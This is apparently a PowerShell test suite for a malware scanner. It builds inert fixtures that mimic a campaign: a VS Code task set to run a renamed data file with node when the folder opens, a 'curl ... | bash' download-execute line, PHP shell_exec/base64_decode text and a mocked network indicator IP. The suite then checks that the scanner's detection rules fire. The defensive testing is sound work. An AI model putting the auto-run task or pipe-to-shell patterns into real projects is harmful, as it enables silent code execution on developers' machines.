# Inert fixtures only. Run with powershell -NoProfile -File tests/Scanner.Tests.ps1
$ErrorActionPreference = 'Stop'
. (Join-Path (Split-Path $PSScriptRoot) 'Scanner.ps1')
function Assert($condition, $message) { if (-not $condition) { throw $message } }
$fixtureRoot=Join-Path ([IO.Path]::GetTempPath()) ('polinrider-tests-'+[guid]::NewGuid())
[IO.Directory]::CreateDirectory($fixtureRoot) | Out-Null
function WriteFixture($relative,$content) {
    $p=Join-Path $fixtureRoot $relative
    [IO.Directory]::CreateDirectory([IO.Path]::GetDirectoryName($p)) | Out-Null
    [IO.File]::WriteAllText($p,$content,[Text.UTF8Encoding]::new($false))
    return $p
}
try {
    $payload=WriteFixture 'nested/assets/renamed.data' ('INERT FIXTURE '+(' ' * 65536)+('rmcej'+'%otb%')+' '+('_$_'+'1e42'))
    WriteFixture 'nested/.vscode/tasks.json' @'
{
 // comments and commas are legitimate JSONC
 "tasks": [{"label":"test", "runOptions":{"runOn":"folderOpen"},
 "windows":{"command":"node", "args":["./assets/renamed.data"]},}],
}
'@ | Out-Null
    WriteFixture 'nested/.vscode/settings.json' '{"task.allowAutomaticTasks":true,"terminal.integrated.profiles.windows":{"custom":{"path":"helper.cmd"}}}' | Out-Null
    WriteFixture 'nested/.vscode/launch.json' '{"configurations":[{"runtimeExecutable":"node","program":"${workspaceFolder}/assets/renamed.data"}]}' | Out-Null
    WriteFixture 'rotated.ts' ('INERT FIXTURE '+('Cot%3'+'t=shtP')+' '+('111'+'1436')) | Out-Null
    WriteFixture 'structural.js' ('INERT TEXT: '+('global.i'+' = A8 ')+('_'+'0xabcdef')) | Out-Null
    WriteFixture 'package.json' '{"dependencies":{"tailwindcss-style-animate":"1.1.6"},"scripts":{"inspect":"node nested/assets/renamed.data"}}' | Out-Null
    WriteFixture 'fake.woff2' ('INERT FIXTURE '+('rmcej'+'%otb%')+' '+('_$_'+'1e42')) | Out-Null
    WriteFixture 'fake.llf' ('INERT FIXTURE '+('Cot%3'+'t=shtP')+' '+('389'+'6884')) | Out-Null
    WriteFixture 'index.php' 'INERT TEXT shell_exec( node base64_decode' | Out-Null
    WriteFixture 'propagation.bat' 'INERT TEXT commit --amend git push --no-verify date %' | Out-Null
    WriteFixture '.vscode/tasks.json' ('{"tasks":[{"command":"curl https://example.invalid/inert'+(' | ')+ 'bash"}]}') | Out-Null
    WriteFixture 'node_modules/dependency/index.js' ('INERT FIXTURE '+('rmcej'+'%otb%')+' '+('_$_'+'1e42')) | Out-Null
    WriteFixture 'broken/.vscode/tasks.json' '{"tasks":[{"command":"node ${env:UNKNOWN}/asset.data"}]' | Out-Null
    WriteFixture 'pnpm-lock.yaml' 'lockfileVersion: 9' | Out-Null
    WriteFixture 'loader.ts' 'INERT TEXT fetch( eval(' | Out-Null
    WriteFixture 'outside/.vscode/tasks.json' '{"tasks":[{"command":"node ../../../../outside.data"}]}' | Out-Null
    WriteFixture 'spaces/.vscode/tasks.json' '{"tasks":[{"command":"node","args":["assets/space name.data"]}]}' | Out-Null
    WriteFixture 'spaces/assets/space name.data' ('INERT FIXTURE '+('rmcej'+'%otb%')+' '+('_$_'+'1e42')) | Out-Null
    $before=@{}
    Get-ChildItem -LiteralPath $fixtureRoot -Recurse -File | ForEach-Object { $before[$_.FullName]=(Get-FileHash -LiteralPath $_.FullName).Hash }
    $report=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -HostProvider {
        @{ Processes=@([pscustomobject]@{Name='node.exe';ProcessId=99;ParentProcessId=12;ExecutablePath='node.exe';CommandLine='node fake.llf SECRET_DO_NOT_LOG'})
           Connections=@([pscustomobject]@{OwningProcess=99;RemoteAddress='166.88.54.158'}); Artifacts=@('inert/_credentials.json') }
    }
    Assert ($report.Result -eq 'INDICATORS FOUND') 'Expected campaign evidence.'
    foreach ($rule in @('campaign-markers','node-asset','automatic-task','automatic-tasks-enabled','font-container','php-wrapper','history-rewrite','download-execute','campaign-package','loader-structure','suspicious-launch','credential-staging','legacy-network-indicator','remote-evaluation')) {
        Assert (@($report.Findings | Where-Object RuleId -eq $rule).Count -gt 0) "Missing rule $rule"
    }
    Assert (@($report.Findings | Where-Object { $_.Path -eq $payload -and $_.SHA256 -and $_.Reference }).Count -gt 0) 'Missing payload hash/reference.'
    Assert (@($report.Findings | Where-Object Path -like '*node_modules*').Count -eq 0) 'Dependencies should be excluded.'
    Assert ($report.Coverage.ExcludedDependencyDirectories -eq 1) 'Dependency exclusions not recorded.'
    Assert ($report.CoverageIssues.Count -ge 2) 'Parser/lockfile gaps not recorded.'
    Assert (@($report.CoverageIssues | Where-Object Reason -like '*outside selected roots*').Count -gt 0) 'Out-of-scope references not reported.'
    Assert (@($report.Findings | Where-Object { $_.Path -like '*space name.data' -and $_.Reference }).Count -gt 0) 'Arguments with spaces not resolved.'
    Assert (($report | ConvertTo-Json -Depth 12) -notmatch 'SECRET_DO_NOT_LOG') 'Process secret leaked.'
    Assert (@($report.LegacyFileEvidence | Where-Object Path -like '*.woff2').Count -eq 0) 'Font findings must never enter legacy text cleanup.'
    Assert (@($report.LegacyFileEvidence | Where-Object Path -like '*.data').Count -eq 0) 'Renamed payloads must remain outside legacy text cleanup.'
    foreach ($p in $before.Keys) { Assert ((Get-FileHash -LiteralPath $p).Hash -eq $before[$p]) 'Scanner changed a fixture.' }
    $full=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -IncludeDependencies $true
    Assert (@($full.Findings | Where-Object Path -like '*node_modules*').Count -gt 0) 'Opt-in dependencies not scanned.'
    $stopped=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -IsCancelled { $true }
    Assert ($stopped.Result -eq 'STOPPED' -and $stopped.CoverageIssues.Count) 'Cancellation must not appear clean.'
    $limited=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -MaxFileSize 4
    Assert ($limited.Result -eq 'INCOMPLETE') 'Oversized files must not appear clean.'
    $empty=Join-Path $fixtureRoot 'benign'; [IO.Directory]::CreateDirectory($empty) | Out-Null
    WriteFixture 'benign/.vscode/tasks.json' '{"tasks":[{"command":"npm","args":["run","build"]}]}' | Out-Null
    WriteFixture 'benign/normal.js' 'INERT TEXT eval example obfuscation' | Out-Null
    # Minimal valid sfnt container: one table, offset 28, length 4. Never rendered.
    $font=New-Object byte[] 32; $font[1]=1; $font[5]=1; $font[23]=28; $font[27]=4
    [IO.File]::WriteAllBytes((Join-Path $empty 'normal.ttf'),$font)
    $clean=Invoke-PolinRiderScan -ScanPaths $empty
    Assert ($clean.Result -eq 'NO INDICATORS IN SCOPE' -and $clean.Findings.Count -eq 0) 'Benign fixtures misclassified.'
    $cap=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -MaxFiles 2
    Assert ($cap.CoverageIssues.Count -gt 0) 'Discovery cap must be visible.'
    $missing=Invoke-PolinRiderScan -ScanPaths (Join-Path $fixtureRoot 'missing')
    Assert ($missing.Result -eq 'INCOMPLETE') 'Missing roots must not appear clean.'
    # Background runspace returns one structured report, without WPF or host probing.
    $worker=[powershell]::Create()
    try {
        [void]$worker.AddScript('param($module,$root) . $module; Invoke-PolinRiderScan -ScanPaths $root')
        [void]$worker.AddArgument((Join-Path (Split-Path $PSScriptRoot) 'Scanner.ps1'))
        [void]$worker.AddArgument($empty)
        $workerResult=$worker.Invoke()
        Assert ($worker.Streams.Error.Count -eq 0 -and $workerResult.Count -eq 1 -and $workerResult[0].SchemaVersion -eq 2) 'Background integration failed.'
    } finally { $worker.Dispose() }
    # Junction target must be skipped; use another harmless fixture directory only.
    $junction=Join-Path $empty 'linked'
    New-Item -ItemType Junction -Path $junction -Target (Join-Path $fixtureRoot 'nested') | Out-Null
    try {
        $linked=Invoke-PolinRiderScan -ScanPaths $empty
        Assert (@($linked.CoverageIssues | Where-Object Reason -like '*Reparse point*').Count -gt 0) 'Junction exclusion not reported.'
        Assert ($linked.Findings.Count -eq 0) 'Junction target was traversed.'
    } finally { [IO.Directory]::Delete($junction) }
    # Integration: parse app without launching its UI; round-trip its real history boundary.
    $tokens=$null; $errors=$null
    $ast=[System.Management.Automation.Language.Parser]::ParseFile((Join-Path (Split-Path $PSScriptRoot) 'app.ps1'),[ref]$tokens,[ref]$errors)
    Assert ($errors.Count -eq 0) 'Application parse failed.'
    $xamlNode=$ast.Find({param($n) $n -is [System.Management.Automation.Language.StringConstantExpressionAst] -and $n.Value.StartsWith('<Window ')},$true)
    [xml]$xml=$xamlNode.Value
    Assert ($null -ne $xml.SelectSingleNode('//*[@Name="DependenciesCheck"]')) 'Dependency option missing from XAML.'
    foreach ($name in @('Load-History','Save-History')) {
        $fn=$ast.Find({param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq $name}.GetNewClosure(),$true)
        . ([scriptblock]::Create($fn.Extent.Text))
    }
    $historyFile=Join-Path $fixtureRoot 'history.json'
    Save-History $report
    $loaded=@(Load-History)
    Assert ($loaded.Count -eq 1 -and $loaded[0].SchemaVersion -eq 2 -and $loaded[0].Findings.Count -eq $report.Findings.Count) 'Structured history did not round-trip.'
    [IO.File]::WriteAllText($historyFile,'[{"Result":"CLEAN","Files":2}]')
    Assert (@(Load-History).Count -eq 1) 'Legacy history no longer loads.'
    Write-Output 'PASS: scanner boundary, JSONC, references, fonts, signatures, dependencies, host metadata, limits, cancellation and unchanged bytes.'
} finally {
    $resolved=[IO.Path]::GetFullPath($fixtureRoot)
    $temp=[IO.Path]::GetFullPath([IO.Path]::GetTempPath())
    if ($resolved.StartsWith($temp,[StringComparison]::OrdinalIgnoreCase) -and [IO.Path]::GetFileName($resolved).StartsWith('polinrider-tests-')) { Remove-Item -LiteralPath $resolved -Recurse -Force }
}
